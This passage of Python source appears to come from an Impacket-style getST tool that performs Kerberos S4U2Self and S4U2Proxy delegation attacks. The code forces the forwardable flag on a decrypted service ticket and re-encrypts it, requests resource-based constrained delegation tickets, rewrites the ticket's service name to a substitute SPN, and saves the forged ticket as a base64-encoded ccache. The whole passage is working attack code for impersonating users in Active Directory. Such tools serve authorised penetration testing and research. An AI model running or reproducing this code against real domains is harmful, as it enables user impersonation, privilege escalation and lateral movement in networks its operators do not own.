                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Customize flags the forwardable flag is the only one that really matters
            logging.info('\tForcing the service ticket to be forwardable')
            # convert to string of bits
            flagBits = encTicketPart['flags'].asBinary()
            # Set the forwardable flag. Awkward binary string insertion
            flagBits = flagBits[:TicketFlags.forwardable.value] + '1' + flagBits[TicketFlags.forwardable.value + 1:]
            # Overwrite the value with the new bits
            encTicketPart['flags'] = encTicketPart['flags'].clone(value=flagBits)  # Update flags

            logging.debug('\tService ticket flags after modification: ' + str(encTicketPart['flags']))
            logging.debug('\tService ticket now is'
                          + ('' if (encTicketPart['flags'][TicketFlags.forwardable.value] == 1) else ' not')
                          + ' forwardable')

            # Re-encode and re-encrypt the ticket
            # Again, Key Usage 2
            encodedEncTicketPart = encoder.encode(encTicketPart)
            cipherText = newCipher.encrypt(key, 2, encodedEncTicketPart, None)

            # put it back in the TGS
            tgs['ticket']['enc-part']['cipher'] = cipherText

        ################################################################################
        # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
        # So here I have a ST for me.. I now want a ST for another service
        # Extract the ticket from the TGT
        ticketTGT = Type_Ticket()
        ticketTGT.from_asn1(decodedTGT['ticket'])

        # Get the service ticket
        ticket = Type_Ticket()
        ticket.from_asn1(tgs['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticketTGT.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # Add resource-based constrained delegation support
        paPacOptions = PA_PAC_OPTIONS()
        paPacOptions['flags'] = constants.encodeFlags((constants.PAPacOptions.resource_based_constrained_delegation.value,))

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
        tgsReq['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        # This specified we're doing S4U
        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        service2 = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, 'sname', service2.components_to_asn1)
        reqBody['realm'] = self.domain

        myTicket = ticket.to_asn1(TicketAsn1())
        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (
                         int(constants.EncryptionTypes.rc4_hmac.value),
                         int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                         int(constants.EncryptionTypes.des_cbc_md5.value),
                         int(cipher.enctype)
                     )
                     )
        message = encoder.encode(tgsReq)

        logging.info('Requesting S4U2Proxy')
        r = sendReceive(message, self.domain, kdcHost)
        return r, None, sessionKey, None

    def decode_ST(self, ticket, sessionKey, altservice=None):
        ccache = CCache()
        if altservice == None:
            altservice = self.spn
        if altservice is not None:
            decodedST = decoder.decode(ticket, asn1Spec=TGS_REP())[0]
            sname = decodedST['ticket']['sname']['name-string']
            if len(decodedST['ticket']['sname']['name-string']) == 1:
                logging.debug("Original sname is not formatted as usual (i.e. CLASS/HOSTNAME), automatically filling the substitution service will fail")
                logging.debug("Original sname is: %s" % sname[0])
                if '/' not in altservice:
                    raise ValueError("Substitution service must include service class AND name (i.e. CLASS/HOSTNAME@REALM, or CLASS/HOSTNAME)")
                service_class, service_hostname = ('', sname[0])
                service_realm = decodedST['ticket']['realm']
            elif len(decodedST['ticket']['sname']['name-string']) == 2:
                service_class, service_hostname = decodedST['ticket']['sname']['name-string']
                service_realm = decodedST['ticket']['realm']
            else:
                logging.debug("Original sname is: %s" % '/'.join(sname))
                raise ValueError("Original sname is not formatted as usual (i.e. CLASS/HOSTNAME), something's wrong here...")
            if '@' in altservice:
                new_service_realm = altservice.split('@')[1].upper()
                if not '.' in new_service_realm:
                    logging.debug("New service realm is not FQDN, you may encounter errors")
                if '/' in altservice:
                    new_service_hostname = altservice.split('@')[0].split('/')[1]
                    new_service_class = altservice.split('@')[0].split('/')[0]
                else:
                    logging.debug("No service hostname in new SPN, using the current one (%s)" % service_hostname)
                    new_service_hostname = service_hostname
                    new_service_class = altservice.split('@')[0]
            else:
                logging.debug("No service realm in new SPN, using the current one (%s)" % service_realm)
                new_service_realm = service_realm
                if '/' in altservice:
                    new_service_hostname = altservice.split('/')[1]
                    new_service_class = altservice.split('/')[0]
                else:
                    logging.debug("No service hostname in new SPN, using the current one (%s)" % service_hostname)
                    new_service_hostname = service_hostname
                    new_service_class = altservice
            if len(service_class) == 0:
                current_service = "%s@%s" % (service_hostname, service_realm)
            else:
                current_service = "%s/%s@%s" % (service_class, service_hostname, service_realm)
            new_service = "%s/%s@%s" % (new_service_class, new_service_hostname, new_service_realm)
            self.f_name += "@" + new_service.replace("/", "_")
            logging.info('Changing service from %s to %s' % (current_service, new_service))
            # the values are changed in the ticket
            decodedST['ticket']['sname']['name-string'][0] = new_service_class
            decodedST['ticket']['sname']['name-string'][1] = new_service_hostname
            decodedST['ticket']['realm'] = new_service_realm
            ticket = encoder.encode(decodedST)
            ccache.fromTGS(ticket, sessionKey, sessionKey)
            # the values need to be changed in the ccache credentials
            # we already checked everything above, we can simply do the second replacement here
            for creds in ccache.credentials:
                creds['server'].fromPrincipal(Principal(new_service, type=constants.PrincipalNameType.NT_PRINCIPAL.value))
        else:
            ccache.fromTGS(ticket, sessionKey, sessionKey)
            creds = ccache.credentials[0]
            service_realm = creds['server'].realm['data']
            service_class = ''
            if len(creds['server'].components) == 2:
                service_class = creds['server'].components[0]['data']
                service_hostname = creds['server'].components[1]['data']
            else:
                service_hostname = creds['server'].components[0]['data']
            if len(service_class) == 0:
                service = "%s@%s" % (service_hostname, service_realm)
            else:
                service = "%s/%s@%s" % (service_class, service_hostname, service_realm)
            self.f_name += "@" + service.replace("/", "_")
        logging.info('Saving ticket in %s' % (self.f_name + '.ccache'))
        ccache.saveFile(self.f_name + '.ccache')


    def run(self, target_user,u2u, no_s4u2proxy, save=True):
        """ Run it all """
        # ccache = CCache()
        st, cipher, oldSessionKey, sessionKey = self.doS4U(impersonate=target_user, u2u=u2u, no_s4u2proxy=no_s4u2proxy)
        # ccache.fromTGS(st, oldSessionKey, oldSessionKey)
        # ccache.saveFile(self.f_name + '.ccache')
        self.decode_ST(st, sessionKey=oldSessionKey)
        data = open(self.f_name + ".ccache", 'rb').read()
        final = b64encode(data).decode()
        return final


